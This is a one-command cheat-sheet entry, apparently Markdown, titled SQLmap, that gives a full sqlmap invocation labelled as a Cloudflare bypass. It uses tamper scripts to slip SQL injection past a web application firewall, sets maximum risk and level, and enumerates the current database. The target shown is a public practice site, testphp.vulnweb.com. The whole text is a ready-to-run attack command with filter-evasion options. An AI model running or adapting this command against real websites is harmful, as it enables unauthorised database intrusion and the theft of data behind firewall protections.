<h1>SQLmap</h1>

### Cloudflare bypass tamper=space2comment,between,randomcase
```
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1*" --batch --random-agent --risk=3 --level=5 --current-db --tamper=space2comment,between,randomcase --no-cast
```
